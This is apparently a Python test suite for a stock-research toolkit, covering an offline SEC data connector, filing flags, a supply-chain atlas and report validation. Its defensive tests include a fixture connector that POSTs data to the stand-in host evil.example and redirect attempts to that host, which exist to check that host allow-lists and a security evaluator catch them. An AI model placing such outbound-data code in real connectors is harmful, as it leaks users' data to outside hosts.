"""v6 doctrine, live-data connector (offline), atlas, lead scan and lens contract tests.

No test touches the network: the connector is exercised through its pure
functions, its allow-list guard, and a pre-seeded cache in offline mode.
"""
import copy
import json
import sys
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

SOURCE_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SOURCE_ROOT / "scripts"))
sys.path.insert(0, str(SOURCE_ROOT / "connectors"))

import atlas as atlas_mod  # noqa: E402
import chokepoint_scan  # noqa: E402
import live_data  # noqa: E402
import render_report  # noqa: E402
import run_evals  # noqa: E402
import serenity_lens  # noqa: E402
import verify_report  # noqa: E402

AXTI_LENS = SOURCE_ROOT / "examples" / "axti-serenity-lens.json"
AXTI_SNAP = SOURCE_ROOT / "examples" / "live" / "axti-snapshot-2026-10-18.json"
UTC = timezone.utc


def axti():
    return json.loads(AXTI_LENS.read_text(encoding="utf-8"))


class DoctrineIdsTest(unittest.TestCase):
    def test_playbook_and_doctrine_share_one_namespace(self):
        ids = serenity_lens.playbook_ids()
        for rule in ("PB-CORE-01", "PB-LAW-08", "PB-VP-10", "PB-FIT-01", "PB-FIN-02",
                     "ARC-SUPER-SUPPLIER", "ARC-BOTTLENECK-OF-BOTTLENECK"):
            self.assertIn(rule, ids)
        self.assertGreaterEqual(len([i for i in ids if i.startswith("PB-")]), 150)

    def test_doctrine_cites_post_ids_not_text(self):
        text = (SOURCE_ROOT / "references" / "serenity-doctrine.md").read_text(encoding="utf-8")
        self.assertRegex(text, r"\b20\d{17}\b")
        self.assertNotIn("x.com/", text.replace("x.com/i/status/<id>", ""))


class ConnectorOfflineTest(unittest.TestCase):
    def test_allowlist_rejects_foreign_host_and_plain_http(self):
        f = live_data.Fetcher(offline=True)
        for url in ("https://evil.example/x", "http://data.sec.gov/x", "ftp://www.sec.gov/x"):
            with self.assertRaises(live_data.SourceError):
                f.get(url, "sec")

    def test_redirect_off_allowlist_is_refused(self):
        handler = live_data._AllowlistRedirect()
        with self.assertRaises(live_data.SourceError):
            handler.redirect_request(None, None, 302, "Found", {}, "https://evil.example/landing")

    def test_offline_mode_uses_cache_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = live_data.Fetcher(cache_dir=Path(tmp), offline=True)
            url = "https://data.sec.gov/api/xbrl/companyfacts/CIK0000000001.json"
            with self.assertRaises(live_data.SourceError):
                f.get(url, "sec")
            cache = f._cache_path(url)
            cache.parent.mkdir(parents=True, exist_ok=True)
            cache.write_bytes(b'{"ok": true}')
            self.assertEqual(f.json(url, "sec"), {"ok": True})
            self.assertEqual(f.log[-1]["cache"], "hit")

    def test_quarterly_derives_from_year_to_date_chain(self):
        rows = [
            {"start": "2026-01-01", "end": "2026-03-31", "days": 89, "value": 10, "filed": "2026-05-01", "unit": "USD"},
            {"start": "2026-01-01", "end": "2026-06-30", "days": 180, "value": 25, "filed": "2026-08-01", "unit": "USD"},
            {"start": "2026-01-01", "end": "2026-09-30", "days": 272, "value": 45, "filed": "2026-11-01", "unit": "USD"},
        ]
        q = live_data._quarterly(rows)
        self.assertEqual([x["value"] for x in q], [10, 15, 20])
        self.assertEqual(q[1].get("derived"), "YTD-diff")

    def test_ttm_requires_consecutive_quarters_and_yoy(self):
        ends = ["2025-06-30", "2025-09-30", "2025-12-31", "2026-03-31", "2026-06-30"]
        series = [{"end": e, "value": v} for e, v in zip(ends, [10, 12, 14, 16, 30])]
        self.assertEqual(live_data.ttm(series), 12 + 14 + 16 + 30)
        gap = [series[0], series[1], series[3], series[4]]
        self.assertIsNone(live_data.ttm(gap))
        self.assertAlmostEqual(live_data.yoy_pct(series), 200.0, places=3)

    def test_filing_radar_marks_underwritten_takedowns(self):
        def row(form, filed, items=""):
            return {"form": form, "filed": filed, "items": [s for s in items.split(",") if s],
                    "accession": "x", "url": "https://www.sec.gov/x", "description": ""}
        subs = {"filings": [
            row("424B5", "2026-04-22"), row("8-K", "2026-04-21", "1.01,9.01"),
            row("424B5", "2026-01-10"),
            row("S-3ASR", "2025-12-01"),
        ]}
        radar = live_data.filing_radar(subs, now=datetime(2026, 10, 18, tzinfo=UTC))
        flags = {f["flag"]: f for f in radar["flags"]}
        self.assertIn("shelf_registration_on_file", flags)
        self.assertEqual(flags["repeated_prospectus_takedowns"]["likely_underwritten"], 1)

    def test_snapshot_helpers_build_cited_evidence(self):
        snap = json.loads(AXTI_SNAP.read_text(encoding="utf-8"))
        ev = live_data.build_evidence(snap)
        ids = {e["evidence_id"] for e in ev}
        self.assertIn("E-LIVE-QUOTE", ids)
        self.assertTrue(all(e["retrieved_at"] and e["locator"].startswith("https://") for e in ev))
        cur = live_data.market_current(snap)
        self.assertAlmostEqual(cur["market_cap"], cur["price"] * cur["shares_outstanding"], places=0)


class AtlasAndScanTest(unittest.TestCase):
    def test_atlas_validates_and_markdown_is_current(self):
        data = atlas_mod.load_atlas()
        self.assertEqual(atlas_mod.validate(data), [])
        md = (SOURCE_ROOT / "references" / "chokepoint-atlas.md").read_text(encoding="utf-8")
        self.assertEqual(md, atlas_mod.render_md(data) + "\n")

    def test_atlas_rejects_dangling_upstream(self):
        data = copy.deepcopy(atlas_mod.load_atlas())
        data["chains"][0]["nodes"][0]["upstream"] = ["no_such_node"]
        self.assertTrue(atlas_mod.validate(data))

    def test_ticker_lookup_returns_next_hop_upstream(self):
        hit = atlas_mod.lookup_ticker(atlas_mod.load_atlas(), "AXTI")
        self.assertTrue(hit["found"])
        hops = {x["ticker"] for p in hit["positions"] for x in p["next_hop_candidates"]}
        self.assertIn("4092.T", hops)
        self.assertNotIn("AXTI", hops)
        miss = atlas_mod.lookup_ticker(atlas_mod.load_atlas(), "ZZZZ-NOPE")
        self.assertFalse(miss["found"])

    def test_scan_on_axti_snapshot(self):
        snap = json.loads(AXTI_SNAP.read_text(encoding="utf-8"))
        row = chokepoint_scan.scan_snapshot(snap, atlas_mod.load_atlas())
        kinds = {s["signal"] for s in row["signals"]}
        self.assertTrue({"pricing_power", "acceleration", "dilution"} <= kinds)
        self.assertEqual(row["framework_fit_guess"]["role"], "chokepoint")
        self.assertEqual(row["phase_guess"], "volume_ramp")
        takedown = [s for s in row["signals"] if s["signal"] == "repeated_prospectus_takedowns"]
        self.assertTrue(takedown and "look underwritten" in takedown[0]["detail"])


class LensV6Test(unittest.TestCase):
    def test_axti_example_validates(self):
        self.assertEqual(serenity_lens.validate(axti()), [])

    def assertError(self, lens, code):
        errors = serenity_lens.validate(lens)
        self.assertTrue(any(code in e for e in errors), errors)

    def test_missing_v6_block(self):
        lens = axti()
        del lens["variant_perception"]
        self.assertError(lens, "v6_missing_field:variant_perception")

    def test_reason_codes_must_be_variant_codes(self):
        lens = axti()
        lens["variant_perception"]["reason_codes"] = ["PB-VAL-05"]
        self.assertError(lens, "v6_reason_code_must_be_pb_vp")

    def test_our_view_needs_a_number_and_must_differ(self):
        lens = axti()
        lens["variant_perception"]["our_view"] = "Market is wrong about the supply contracts and the cycle."
        self.assertError(lens, "v6_our_view_requires_numbers")
        lens = axti()
        lens["variant_perception"]["our_view"] = lens["variant_perception"]["consensus"]
        self.assertError(lens, "v6_our_view_equals_consensus")

    def test_stale_live_data(self):
        lens = axti()
        lens["live_data"]["retrieved_at"] = "2026-09-01T00:00:00Z"
        self.assertError(lens, "v6_live_data_stale")

    def test_unhandled_warning(self):
        lens = axti()
        lens["live_data"]["warnings_addressed"] = [{"warning": "quote_older_than_5_days", "handling": "ok"}]
        self.assertError(lens, "v6_live_warning_not_handled")

    def test_framework_fit_needs_pb_fit_rule(self):
        lens = axti()
        lens["framework_fit"]["rule_ids"] = ["PB-LAW-02"]
        self.assertError(lens, "v6_framework_fit_requires_pb_fit_rule")

    def test_next_hop_cannot_be_subject(self):
        lens = axti()
        lens["next_hop_picks"][0]["ticker"] = lens["subject"]["resolved_symbol"]
        self.assertError(lens, "v6_next_hop_cannot_be_subject")

    def test_green_blocked_by_phase_and_status(self):
        lens = axti()
        lens["research_tier"] = "green"
        lens["phase"]["stage"] = "rnd"
        lens["bottleneck_status"]["status"] = "unknown"
        errors = serenity_lens.validate(lens)
        self.assertTrue(any("v6_green_incompatible_with_phase" in e for e in errors), errors)
        self.assertTrue(any("v6_green_requires_live_bottleneck_status" in e for e in errors), errors)

    def test_weak_fit_cannot_claim_active_bottleneck(self):
        lens = axti()
        lens["framework_fit"]["fit"] = "weak"
        self.assertError(lens, "v6_weak_fit_cannot_claim_active_bottleneck")


class RenderV6Test(unittest.TestCase):
    def test_render_contains_v6_sections_and_verifies(self):
        lens = axti()
        self.assertEqual(render_report.required_sections(lens)[-4:], render_report.V6_SECTIONS)
        with tempfile.TemporaryDirectory() as tmp:
            lens_path = Path(tmp) / "axti-serenity-lens.json"
            lens_path.write_text(json.dumps(lens, ensure_ascii=False), encoding="utf-8")
            md = render_report.to_markdown(lens)
            html = render_report.to_html(lens)
            for sec in render_report.V6_SECTIONS:
                self.assertIn(f"<!-- section:{sec} -->", md)
            self.assertEqual(verify_report.verify_markdown(md, lens_path), [])
            self.assertEqual(verify_report.verify(html), [])
            broken = md.replace("<!-- section:variant -->", "")
            self.assertIn("report:missing_section:variant", verify_report.verify_markdown(broken, lens_path))

    def test_shipped_axti_report_matches_lens(self):
        md = (SOURCE_ROOT / "examples" / "axti-serenity-report.md").read_text(encoding="utf-8")
        self.assertEqual(verify_report.verify_markdown(md, AXTI_LENS), [])


class ConnectorBoundaryEvalTest(unittest.TestCase):
    def test_repo_connectors_pass(self):
        errors: list[str] = []
        out = run_evals.check_connectors(SOURCE_ROOT, errors)
        self.assertEqual(errors, [])
        self.assertIn("data.sec.gov", out["hosts"])

    def test_bad_connector_is_caught(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "connectors").mkdir()
            (root / "connectors" / "bad.py").write_text(
                "import socket\nimport urllib.request\n"
                "ALLOWED_HOSTS = frozenset({'evil.example'})\n"
                "urllib.request.Request('https://evil.example', method='POST', data=b'x')\n",
                encoding="utf-8")
            errors: list[str] = []
            run_evals.check_connectors(root, errors)
            joined = " ".join(errors)
            for code in ("connector_banned_import", "connector_non_get_method", "connector_request_body",
                         "connector_host_outside_ceiling"):
                self.assertIn(code, joined)

    def test_scripts_stay_network_free(self):
        errors: list[str] = []
        out = run_evals.check_python_security(SOURCE_ROOT, errors)
        self.assertEqual(out["network_imports"], [])


if __name__ == "__main__":
    unittest.main()